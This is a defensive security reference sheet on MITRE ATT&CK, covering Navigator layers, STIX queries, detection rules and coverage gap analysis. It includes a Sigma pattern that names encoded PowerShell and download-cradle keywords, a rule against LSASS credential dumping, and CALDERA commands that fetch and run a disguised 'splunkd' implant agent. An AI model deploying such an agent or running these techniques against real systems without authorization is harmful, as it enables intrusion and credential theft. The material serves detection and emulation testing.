# MITRE ATT&CK (Adversary Tactics, Techniques, and Common Knowledge)

Knowledge base of adversary behavior organized into tactics and techniques, used for threat modeling, detection engineering, red team planning, and security gap analysis.

## Framework Structure

```bash
# ATT&CK Matrix hierarchy
# Tactic (WHY) -> Technique (HOW) -> Sub-technique (specific HOW)
# 14 Enterprise Tactics (kill chain order):
#
# TA0043 - Reconnaissance        (target research)
# TA0042 - Resource Development   (infrastructure setup)
# TA0001 - Initial Access         (get in)
# TA0002 - Execution              (run code)
# TA0003 - Persistence            (stay in)
# TA0004 - Privilege Escalation   (get higher access)
# TA0005 - Defense Evasion        (avoid detection)
# TA0006 - Credential Access      (steal creds)
# TA0007 - Discovery              (learn environment)
# TA0008 - Lateral Movement       (move around)
# TA0009 - Collection             (gather data)
# TA0010 - Exfiltration           (steal data)
# TA0011 - Command and Control    (communicate with implants)
# TA0040 - Impact                 (disrupt/destroy)

# Example technique path:
# TA0003 (Persistence) -> T1053 (Scheduled Task/Job)
#   -> T1053.003 (Cron)
#   -> T1053.005 (Scheduled Task)
```

## ATT&CK Navigator

```bash
# Install ATT&CK Navigator locally
git clone https://github.com/mitre-attack/attack-navigator.git
cd attack-navigator/nav-app
npm install && npm start
# Opens at http://localhost:4200

# Navigator layer JSON format
{
  "name": "SOC Detection Coverage",
  "versions": { "attack": "14", "navigator": "4.9.1" },
  "domain": "enterprise-attack",
  "techniques": [
    {
      "techniqueID": "T1059",
      "tactic": "execution",
      "color": "#31a354",
      "comment": "Covered by Sysmon + SIEM rule",
      "score": 75,
      "enabled": true
    },
    {
      "techniqueID": "T1059.001",
      "tactic": "execution",
      "color": "#31a354",
      "comment": "PowerShell logging enabled, SIEM correlation",
      "score": 90
    }
  ],
  "gradient": {
    "colors": ["#ff6666", "#ffff66", "#31a354"],
    "minValue": 0,
    "maxValue": 100
  }
}

```

## ATT&CK API and STIX Data

```bash
# Query ATT&CK via TAXII server
pip install stix2 taxii2-client mitreattack-python

# Python: Fetch techniques
python3 << 'PYEOF'
from mitreattack.stix20 import MitreAttackData

attack = MitreAttackData("enterprise-attack.json")

# Get all techniques
techniques = attack.get_techniques()
print(f"Total techniques: {len(techniques)}")

# Get techniques for a tactic
persistence = attack.get_techniques_by_tactic("persistence")
for t in persistence[:5]:
    print(f"  {t.external_references[0].external_id}: {t.name}")

# Get mitigations for a technique
mitigations = attack.get_mitigations_mitigating_technique("T1059.001")
for m in mitigations:
    print(f"  Mitigation: {m.name}")

# Get groups using a technique
groups = attack.get_groups_using_technique("T1566.001")
for g in groups:
    print(f"  Group: {g.name}")
PYEOF

# Download ATT&CK STIX data
curl -O https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json

# Query with jq
cat enterprise-attack.json | jq '
  .objects[] |
  select(.type == "attack-pattern") |
  select(.x_mitre_platforms[]? == "Linux") |
  {id: .external_references[0].external_id, name: .name}
' | head -40
```

## Threat Group Mapping

```bash
# Map threat groups to techniques
python3 << 'PYEOF'
from mitreattack.stix20 import MitreAttackData

attack = MitreAttackData("enterprise-attack.json")

# Get group info
groups = attack.get_groups()
for g in sorted(groups, key=lambda x: x.name)[:10]:
    ext_id = g.external_references[0].external_id
    print(f"{ext_id}: {g.name}")
    techs = attack.get_techniques_used_by_group(g.id)
    for t in techs[:3]:
        tid = t.external_references[0].external_id
        print(f"  -> {tid}: {t.name}")
PYEOF

# Notable groups and their focus areas:
# APT28 (G0007) - Russian GRU, phishing + credential theft
# APT29 (G0016) - Russian SVR, supply chain + cloud
# Lazarus (G0032) - North Korea, financial + destructive
# APT41 (G0096) - Chinese, dual espionage + financial
# FIN7 (G0046)  - Financial crime, POS malware
```

## Detection Engineering with ATT&CK

```bash
# Sigma rule with ATT&CK mapping
# rules/windows/process_creation/win_susp_powershell.yml
title: Suspicious PowerShell Command Line
status: stable
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - '-enc'
            - '-EncodedCommand'
            - 'IEX'
            - 'Invoke-Expression'
            - 'downloadstring'
    condition: selection
tags:
    - attack.execution
    - attack.t1059.001
    - attack.defense_evasion
    - attack.t1027
level: high

# Convert Sigma to SIEM queries
pip install sigma-cli
sigma convert -t splunk -p sysmon rules/windows/

# Splunk detection with ATT&CK annotation
# T1053.005 - Scheduled Task creation
index=sysmon EventCode=1
  (Image="*schtasks.exe" CommandLine="*/create*")
  OR (Image="*at.exe")
| eval mitre_technique="T1053.005"
| eval mitre_tactic="persistence"

# Elastic detection rule with ATT&CK metadata
PUT _security/detection_engine/rules
{
  "name": "Credential Dumping via LSASS",
  "rule_id": "detect-t1003-001",
  "type": "query",
  "query": "event.category:process AND process.name:procdump* AND process.args:lsass*",
  "threat": [{
    "framework": "MITRE ATT&CK",
    "tactic": { "id": "TA0006", "name": "Credential Access" },
    "technique": [{
      "id": "T1003",
      "name": "OS Credential Dumping",
      "subtechnique": [{ "id": "T1003.001", "name": "LSASS Memory" }]
    }]
  }]
}
```

## CALDERA (Adversary Emulation)

```bash
# Install CALDERA
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip install -r requirements.txt
python server.py --insecure --build

# Deploy Sandcat agent to target
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
  http://caldera-server:8888/file/download > splunkd
chmod +x splunkd && ./splunkd -server http://caldera-server:8888 -group red

# Create adversary profile and start operation via API
curl -X POST http://localhost:8888/api/v2/adversaries \
  -H "KEY:ADMIN_API_KEY" -H "Content-Type: application/json" \
  -d '{"name":"APT29 Sim","atomic_ordering":["T1059.001","T1053.005","T1003.001"]}'
```

## D3FEND and ATLAS

```bash
# D3FEND - Defensive technique knowledge base
# Maps defensive techniques to ATT&CK offensive techniques
# https://d3fend.mitre.org/

# D3FEND categories:
# - Harden (reduce attack surface)
# - Detect (identify adversary actions)
# - Isolate (contain threats)
# - Deceive (mislead adversary)
# - Evict (remove adversary presence)

# Query D3FEND API
curl "https://d3fend.mitre.org/api/offensive-technique/attack/T1059.001.json" | \
  jq '.def_techniques[] | {technique: .label, relationship: .relationship}'

# ATLAS - Adversarial Threat Landscape for AI Systems
# https://atlas.mitre.org/
# Tactics specific to ML/AI systems:
# - ML Model Access
# - ML Attack Staging
# - Data Poisoning (AML.T0020)
# - Model Evasion (AML.T0015)
# - Model Theft (AML.T0044)

# ATT&CK for ICS (Industrial Control Systems)
# Additional tactics:
# - Inhibit Response Function
# - Impair Process Control
# - Damage to Property
# ICS-specific techniques focus on PLCs, HMIs, and SCADA protocols
```

## Coverage Assessment

```bash
# Generate coverage report
python3 << 'PYEOF'
import json

# Load your detection layer
with open("coverage-layer.json") as f:
    layer = json.load(f)

covered = set(t["techniqueID"] for t in layer["techniques"] if t.get("score", 0) > 50)

# Load ATT&CK data
with open("enterprise-attack.json") as f:
    attack = json.load(f)

all_techniques = set()
for obj in attack["objects"]:
    if obj.get("type") == "attack-pattern" and not obj.get("revoked"):
        refs = obj.get("external_references", [])
        if refs and refs[0].get("source_name") == "mitre-attack":
            all_techniques.add(refs[0]["external_id"])

total = len(all_techniques)
detected = len(covered & all_techniques)
gap = all_techniques - covered

print(f"Total techniques: {total}")
print(f"Detected: {detected} ({100*detected/total:.1f}%)")
print(f"Gap: {len(gap)} techniques")
print(f"\nTop uncovered techniques:")
for t in sorted(gap)[:15]:
    print(f"  {t}")
PYEOF
```

## Tips

- Map detection rules to ATT&CK technique IDs in rule metadata from day one; retrofitting is painful
- Focus detection investment on techniques used by threat groups relevant to your industry
- Use Navigator layers to visualize coverage gaps and present them to leadership
- Combine ATT&CK with D3FEND to map defensive capabilities to offensive techniques they counter
- Prioritize high-frequency techniques across multiple groups over rare niche techniques
- Use CALDERA or Atomic Red Team to validate that your detections actually fire on real technique execution
- ATT&CK coverage percentage alone is misleading; quality and tuning of each detection matters more
- Review ATT&CK updates quarterly; new techniques and sub-techniques are added regularly
- Map not just "can detect" but "have detected in production" for honest coverage assessment
- Use sub-technique granularity when mapping; T1059 (Scripting) is too broad to be actionable
- Cross-reference ATT&CK data sources with your actual log sources to find feasible detection opportunities
- Leverage ATT&CK for ICS if you have OT/SCADA environments; enterprise matrix alone is insufficient

## See Also

- SIEM for implementing ATT&CK-mapped detection rules
- Suricata for network-layer technique detection
- osquery for endpoint technique visibility
- CIS Benchmarks for hardening against common techniques
- Reverse Engineering for malware analysis tied to threat groups

## References

- [MITRE ATT&CK Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/)
- [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [MITRE D3FEND](https://d3fend.mitre.org/)
- [MITRE ATLAS](https://atlas.mitre.org/)
- [MITRE CALDERA](https://caldera.mitre.org/)
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
- [Sigma Rules](https://github.com/SigmaHQ/sigma)
- [ATT&CK STIX Data](https://github.com/mitre/cti)
